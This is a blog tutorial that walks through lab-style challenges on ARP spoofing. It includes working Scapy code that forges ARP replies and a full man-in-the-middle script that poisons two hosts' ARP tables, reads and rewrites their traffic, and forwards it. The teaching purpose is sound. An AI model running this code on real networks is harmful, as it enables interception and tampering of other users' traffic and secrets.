---
title: Intercepting traffic and Man in the middle via ARP spoofing
metaDescription: 
date: 2026-02-06T02:00:00.000Z
summary: Talks about how ARP poisoning can be used to intercept the traffic
redirect: https://x.com/bbetterengineer/status/2019802392666231124
tags:
  - cybersecurity
  - infosec
  - linux
  - python
  - scapy
---

So, I will talk about how to intercept the traffic while being on the same LAN. But before that we need to know a bit about communication among different devices on the LAN.

Devices on the same LAN communicates on Layer 2 using:
- Ethernet frames
- MAC addresses
- **Switches** (Layer 2 devices)

Let's say we have three hosts:
- Host A -> IP 10.0.0.1
- Host B -> IP 10.0.0.2
- Host C -> IP 10.0.0.3

Now if host A wants to send packets to host B or C, it needs to know their mac addresses. But how? It happens via **ARP** protocol. Wait wait, I will show you code as well, that will clear all things. But first let's know a bit about **ARP**.

- Used to get the **IP address -> MAC ( hardware address )** mapping.
- **Broadcast** request
- **Unicast** replies
- It is not safe as it is **not authenticated and no way to check if arp response is legit or coming from the right server**.
- Devices accept replies without verification and update their ARP table (ip -> mac mapping). So next time they need to send any packet, they will check the ARP table, form the packet and send to mapped mac address.

So how does **ARP** request looks like?
```python
"""
Host A asks who has the IP 10.0.0.2
"""

from scapy.all import Ether, ARP, sendp, srp

iface = "eth0"
target_ip = "10.0.0.2"

pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(  # Ethernet broadcast
    op=1, pdst=target_ip
)  # ARP who-has

sendp(pkt, iface=iface, verbose=True)

# Ethernet broadcast goes out.
# The host that owns 10.0.0.2 replies with its MAC.

# Send ARP and wait for the reply (most useful)

pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
ans, _ = srp(pkt, iface=iface, timeout=2, verbose=False)

for _, reply in ans:
    print("IP:", reply.psrc, "MAC:", reply.hwsrc)

# ARP requests (broadcast)

```

So now how will host B replies i.e **ARP reply**?

```python
"""
Manually send an Address Resolution Protocol packet. The packet informs the remote host that the IP address 10.0.0.2 can be found at the Ethernet address 42:42:42:42:42:42. The packet should be sent to the remote host at 10.0.0.1.
"""

from scapy.all import Ether, ARP, sendp, srp, get_if_hwaddr

iface = "eth0"

# if need to check same machine mac address
mac_same_machine = get_if_hwaddr("eth0")
print(mac_same_machine)

announced_ip = "10.0.0.2"
announced_mac = "42:42:42:42:42:42"

# Sending ARP reply
target_ip = "10.0.0.1"

pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2,  # ARP reply ("is-at")
    psrc=announced_ip,  # IP being announced
    hwsrc=announced_mac,  # MAC being announced
    pdst=target_ip,  # target IP
    hwdst="ff:ff:ff:ff:ff:ff",
)

# ARP is a Layer-2 (Ethernet) protocol.
sendp(pkt, iface=iface, verbose=True)

```

**REMEMBER:** Broadcast packet is received by all hosts but only the host with matching IP will reply, other hosts will silently drop the arp request.

Now we can manually ( I mean by code ) send the ARP reply packet to any host and spoof their ARP table. VOILA!!

#### Challenge 1:

- Intercept traffic from a remote host. The remote host at 10.0.0.2 (host B)  is communicating with the remote host at 10.0.0.3 (host C) on port 31337? You are at host A 10.0.0.1

```python
# 10.0.0.2
class ClientHost:
    def entrypoint(self):
        while True:
            time.sleep(1)
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.3", 31337))
                client_socket.sendall("some_secret")
                client_socket.close()
            except (OSError, ConnectionError, TimeoutError):
                continue

# 10.0.0.3
class ServerHost:
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()
                connection.recv(1024)
                connection.close()
            except ConnectionError:
                continue
```

- We are at host A (10.0.0.1)
- Host B is a client, sending some sensitive info to host C.
- Host C is running a server, which accepts the packets from Host B and close the connection.
- So we can craft an **arp reply** for machine B, telling that machine C’s ip belongs to host A mac address. It will work as it is not authenticated. It will spoof host B arp table.
- Now when machine B tries to send a packet to machine C, it will check its **arp table** and will find the host A mac address mapped to C's IP.
- Host A will receive the packet but they will be dropped by the kernel, why? Think a bit:
    - Because Host A and Host C ip addresses are different and the kernel will drop them.
    - We can add host C Ip to the **eth0** interface of host A using the below command:
```bash
# Run this on host A
ip addr add 10.0.0.3 dev eth0
```

- Now when the packet comes from host B to host A containing host C ip, they will not be dropped. But if no service is running on the desired port, we will receive nothing.
- So in order to receive complete host B packets, we will run the service on the desired port on host A and we can check the packet data then sent from Host B.

```bash
# Run the web server on host A on port 31337 
# as host B is connecting to host C on port 31337

nc -l 0.0.0.0 31337
```

Congratulations!! If you have made upto this point, you will now have a better understanding.

#### Challenge 2: Man in the Middle 

- Now, not only Host B sends the packet to Host C, but there is back and forth communication between host B and host C. We need to eve drop on the packets, modify them and forward them.
- The code shows the communication between Host B and Host C.
- This code is for demonstration purpose only.

```python
# Host B 10.0.0.2
class AuthenticatedClientHost:
    def entrypoint(self):
        while True:
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.3", 31337))

                assert client_socket.recv(1024) == b"secret: "
                secret = bytes(server_host.secret)  # Get the secret out-of-band
                time.sleep(1)
                client_socket.sendall(secret.hex().encode())

                assert client_socket.recv(1024) == b"command: "
                time.sleep(1)
                client_socket.sendall(b"echo")
                time.sleep(1)
                client_socket.sendall(b"Hello, World!")
                assert client_socket.recv(1024) == b"Hello, World!"

                client_socket.close()
                time.sleep(1)

            except (OSError, ConnectionError, TimeoutError, AssertionError):
                continue

# Host C 10.0.0.3
class AuthenticatedServerHost:
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.secret = multiprocessing.Array("B", 32)

    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()

                self.secret[:] = os.urandom(32)
                time.sleep(1)
                connection.sendall(b"secret: ")
                secret = bytes.fromhex(connection.recv(1024).decode())
                if secret != bytes(self.secret):
                    connection.close()
                    continue

                time.sleep(1)
                connection.sendall(b"command: ")
                command = connection.recv(1024).decode().strip()

                if command == "echo":
                    data = connection.recv(1024)
                    time.sleep(1)
                    connection.sendall(data)
                elif command == "secret":
                    time.sleep(1)
                    connection.sendall("some_secret")

                connection.close()
            except ConnectionError:
                continue
```

- The previous method won't work because now we have bi-directional communication B -> C and C -> B. Earlier B was sending packets to C and that's it.
- Now we need to eves drop what both are communicating.
- So earlier we poison the ARP table of host B only and trick B to think that A is C. But C is also sending packets to B, we have to trick C as well in thinking that A is B. Then we will receive packets from both B and C.

```bash
# Now communication will look like

B -> A -> C
C -> A -> B
```

- So we will poison both B and C arp table and tricking them in sending the packets to A's mac address. Then A will intercept, modify and forward the packets. 
- This is all possible because we are operating at Layer 2 and kernel packet forwarding is disabled. 

```bash
# If it is zero, it means kernel is disabled to forward the packets.
# 1 means, kernel is enabled to forward the packets.

cat /proc/sys/net/ipv4/ip_forward
```

- Now here is the python code to poison the ARP table and intercept, modify and forward mechanism.

```python
"""
Man-in-the-middle traffic from a remote host. The remote host at 10.0.0.2 is communicating with the remote host at 10.0.0.3 on port 31337. 
We are at Host A, 10.0.0.1
"""

from scapy.all import *
import threading


class AttackerHost:
    def entrypoint(self):
        time.sleep(2)

        self.attacker_mac = get_if_hwaddr("eth0")
        self.client_ip = "10.0.0.2"
        self.server_ip = "10.0.0.3"

        # Get real MAC addresses
        self.client_mac = self.get_mac(self.client_ip)
        self.server_mac = self.get_mac(self.server_ip)

        # Start ARP poisoning
        threading.Thread(target=self.arp_poison, daemon=True).start()

        # Manually forward packets
        self.forward_packets()

    def get_mac(self, ip):
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False
        )
        return ans[0][1].hwsrc if ans else None

    def arp_poison(self):
        while True:
            send(
                ARP(
                    op=2,
                    pdst=self.client_ip,
                    hwdst=self.client_mac,
                    psrc=self.server_ip,
                    hwsrc=self.attacker_mac,
                ),
                verbose=False,
            )
            send(
                ARP(
                    op=2,
                    pdst=self.server_ip,
                    hwdst=self.server_mac,
                    psrc=self.client_ip,
                    hwsrc=self.attacker_mac,
                ),
                verbose=False,
            )
            time.sleep(2)

    def forward_packets(self):
        def process(pkt):
            if IP in pkt and TCP in pkt:
                # Client -> Server
                if pkt[IP].src == self.client_ip and pkt[IP].dst == self.server_ip:

                    # Modify payload if needed
                    if Raw in pkt:
                        data = pkt[Raw].load
                        if data == b"echo":
                            print("data from client to server", data)
                            pkt[Raw].load = b"flag"

                    # Forward to server
                    pkt[Ether].src = self.attacker_mac
                    pkt[Ether].dst = self.server_mac
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                    sendp(pkt, verbose=False)

                # Server -> Client
                elif pkt[IP].src == self.server_ip and pkt[IP].dst == self.client_ip:
                    # Forward to client
                    if Raw in pkt:
                        print("data from server to client", pkt[Raw].load)
                    pkt[Ether].src = self.attacker_mac
                    pkt[Ether].dst = self.client_mac
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                    sendp(pkt, verbose=False)

        sniff(prn=process, store=False)


attacker = AttackerHost()
attacker.entrypoint()
```

- Now you will be able to see the data packets between them.

Hurray!! You have learned something new. If you are not able to understand some of the code, check the **scapy** documentation.

I keep tweeting, writing and learning concepts like this. Feel free to reach out via DMs if facing any difficulty or want to discuss something with me.

Follow me for more such content. Happy Learning..
